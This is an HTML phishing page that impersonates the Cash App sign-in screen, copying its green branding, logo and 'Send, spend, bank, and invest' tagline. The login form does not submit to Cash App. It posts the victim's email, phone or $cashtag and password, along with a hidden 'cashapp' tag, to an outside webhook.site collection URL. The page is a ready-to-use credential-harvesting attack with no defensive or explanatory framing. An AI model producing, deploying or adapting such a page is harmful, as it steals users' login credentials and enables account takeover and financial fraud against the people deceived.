<html>
<head>
    <title>Cash App</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #00D632;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            width: 380px;
            text-align: center;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo-text {
            color: #00D632;
            font-size: 42px;
            font-weight: bold;
        }
        .header {
            font-size: 28px;
            margin-bottom: 30px;
            color: #000;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 16px;
            margin: 12px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            background: #f8f8f8;
        }
        input[type="submit"] {
            background: #00D632;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            width: 100%;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
        }
        .tagline {
            color: #666;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">CA$H</div>
        </div>
        <div class="header">Sign In to Cash App</div>

        <form action="https://webhook.site/ac3017bb-31ec-446c-ba45-5b13aae5c7fb" method="POST">
            <input type="hidden" name="site" value="cashapp">
            <input type="text" name="username" placeholder="Email, phone, or $cashtag" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="submit" value="Sign In">
        </form>

        <div class="tagline">Send, spend, bank, and invest</div>
    </div>
</body>
</html>
